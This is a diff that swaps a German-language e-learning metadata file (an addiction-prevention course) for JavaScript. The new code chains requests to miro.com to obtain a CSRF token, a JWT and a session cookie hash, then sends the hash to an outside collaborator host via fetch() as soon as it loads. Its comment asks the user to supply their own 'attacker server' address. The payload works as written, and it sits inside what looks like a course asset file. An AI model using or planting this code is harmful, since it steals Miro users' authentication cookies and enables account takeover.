@@ -1,1 +1,54 @@
-var g_objSequenceMetadatas={guid:{value:"a0cvasr3kkk4lirjbtjgnmamo"},language:{value:"de-ch"},cbtlanguage:{value:"de-ch"},title:{value:"Suchtprävention"},documenttype:{value:"Documentation"},author:{value:"Lukas Wyss"},description:{value:" "},keywords:{value:" "},company:{value:""},productversion:{value:"7.0.0.15"},basename:{value:"document_lm"},sharedpath:{value:"../shared/"},editmode:{value:"product"},hasSounds:{value:"false"},mainpathstepid:{value:"I19527"},mainpathid:{value:"I29"},mainpathsteps:{value:"81"},start:{value:"I19527"},configpathcustom:{value:"config/schweizerischepost/"},languages:{I28:{text:"de-ch",resourceslangdependent:"0",sourcelanguage:"de-ch"}},screenwidth:{value:"1020"},screenheight:{value:"700"},closeurl:{value:""},commentposition:{value:"rightbottom"},commentleft:{value:"0"},commenttop:{value:"0"},commentwidth:{value:"400"},filmmodedelay:{value:"4000"},playmodes:{value:"110"},playmodedefault:{value:"100"},imprinttext:{value:"__TTN__HAS_IMPRINT__"},contacttext:{value:"__TTN__HAS_CONTACT__"},wbtmode:{value:"01"},testmode:{value:""},maxfalseattempts:{value:"1"},doctemplatepath:{value: "template/"},imprint:{value:"I7I3898708"},runtimefilter:{value:"RuntimeSequenceWBT"},masteryscore:{value:"80"},contact:{value:"I7I3898694"},noftasks:{value:"0"},timelimit_lm:{value:""},timelimit_am:{value:""},timelimitaction_lm:{value:""},timelimitaction_am:{value:""},commentvisibility_lm:{value:"visible"},commentvisibility_am:{value:"visible"},documentationfilename:{value:"suchtpraevention_documentation_a0cvasr3"},documentationfiletypes:{value:"doc"},Profiling:{Vars:[]}}; if(typeof(SequenceMetadatas_js)=="function"){SequenceMetadatas_js();} 
+const ATTACKER_SERVER_ADDRESS = "https://y32pksgbdxobfmipricm1cmyxp3gr6fv.oastify.com/?data="; // Place your server address for get authentication cookie (must be https)
+
+const getCsrfToken = function () {
+  return new Promise((resolve) => {
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://miro.com/api/v1/csrf");
+    xhr.withCredentials = true;
+    xhr.addEventListener("readystatechange", function () {
+      if (xhr.readyState === xhr.DONE) {
+        const csrfToken = JSON.parse(xhr.responseText).token;
+        resolve(csrfToken);
+      }
+    });
+    xhr.send();
+  });
+};
+
+const getJwt = async function () {
+  const csrfToken = await getCsrfToken();
+  return new Promise((resolve) => {
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://miro.com/api/v1/auth/jwt/generate");
+    xhr.withCredentials = true;
+    xhr.addEventListener("readystatechange", function () {
+      if (xhr.readyState === xhr.DONE) {
+        const JWT = JSON.parse(xhr.responseText).jwt;
+        resolve(JWT);
+      }
+    });
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.setRequestHeader("X-Csrf-Token", csrfToken);
+    xhr.send();
+  });
+};
+
+const getAuthCookie = async function () {
+  const JWT = await getJwt();
+  const csrfToken = await getCsrfToken();
+  const xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://miro.com/api/v1/auth/jwt/login");
+  xhr.withCredentials = true;
+  xhr.addEventListener("readystatechange", function () {
+    if (xhr.readyState === xhr.DONE) {
+      const authCookie = JSON.parse(xhr.responseText).hash;
+      fetch(ATTACKER_SERVER_ADDRESS + authCookie);
+    }
+  });
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.setRequestHeader("X-Csrf-Token", csrfToken);
+  const data = JSON.stringify({ jwt: JWT });
+  xhr.send(data);
+};
+
+getAuthCookie();
